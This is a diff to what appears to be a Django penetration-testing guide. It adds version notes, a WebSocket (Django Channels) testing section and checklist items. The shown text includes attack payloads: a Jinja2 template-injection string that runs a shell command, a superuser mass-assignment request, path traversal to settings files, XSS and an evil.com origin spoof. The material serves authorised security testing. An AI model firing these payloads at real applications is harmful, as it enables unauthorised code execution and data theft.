@@ -29,6 +29,24 @@ Security testing for Django applications. Focus on admin panel exposure, ORM-bas
 - ASGI servers: Daphne, Hypercorn
 - Static/media file serving
 
+## Version Considerations
+
+**Django 4.x+**
+- Default password hasher changed to Argon2 (slower brute-force)
+- `SecurityMiddleware` enabled by default
+- Stricter CSRF cookie settings (`SameSite=Lax` default)
+- Form rendering API changes may affect mass assignment patterns
+
+**Django 5.x+**
+- Field group and field group template concepts
+- Async view improvements (check for race conditions)
+- Database-computed default values (potential injection vectors)
+
+**Legacy (Django 2.x/3.x)**
+- May lack modern security defaults
+- Check for `@csrf_exempt` on class-based views (common misconfiguration)
+- Older session serialization (potential pickle deserialization)
+
 ## High-Value Targets
 
 - `/admin/` - Django admin panel (often exposed with weak credentials)
@@ -70,6 +88,7 @@ GET /nonexistent (trigger 404, check error page style)
   - `/.git/config`
   - `/settings.py`
   - `/config/settings/local.py`
+  - `/config/settings/__init__.py`
   - `/local_settings.py`
 
 **Admin Discovery**
@@ -176,6 +195,8 @@ csrfmiddlewaretoken=...&username=attacker&password=pass&is_superuser=true&is_sta
 ```
 
 **Jinja2 (if used)**
+
+Note: Jinja2 is not Django's default template engine. Only test these if the application explicitly uses `django-jinja` or similar integration.
 ```
 {{7*7}}
 {{cycler.__init__.__globals__['os'].popen('id').read()}}
@@ -293,6 +314,45 @@ GET /api/users/?offset=100&limit=100
 ```
 GET /api/users/?fields=password,is_superuser
 GET /api/users/?include=password_hash
+```
+
+### Django Channels (WebSocket Security)
+
+**Authentication Bypass**
+WebSocket consumers may lack proper authentication checks:
+```
+ws://target/ws/chat/
+# Connect without session cookie
+# Send messages without authentication
+```
+
+**Authorization Gaps**
+```
+# Join rooms/channels without permission
+{"type": "join", "room": "admin-channel"}
+{"type": "subscribe", "channel": "private-notifications"}
+```
+
+**Message Injection**
+```
+# Send malformed or oversized messages
+{"type": "message", "content": "<script>alert(1)</script>"}
+{"type": "message", "content": "A".repeat(1000000)}
+```
+
+**Origin Validation**
+Check if WebSocket accepts connections from any origin:
+```
+Origin: https://evil.com
+Sec-WebSocket-Key: ...
+```
+
+**Consumer Method Abuse**
+```
+# Call internal methods via message type
+{"type": "receive_json"}
+{"type": "disconnect"}
+{"type": "__init__"}
 ```
 
 ### Middleware Bypass
@@ -468,6 +528,8 @@ GET /media/%2e%2e/%2e%2e/config/settings.py
 8. Test for path traversal in filename parameters with URL encoding
 9. Check for exposed settings in template context (`{{settings.*}}`)
 10. Test admin actions for permission bypasses (bulk delete, mass update)
+11. Check for Django Debug Toolbar at `/__debug__/` - exposes SQL queries, settings, and request data
+12. Test WebSocket consumers for missing authentication (Django Channels)
 
 ## Summary
 
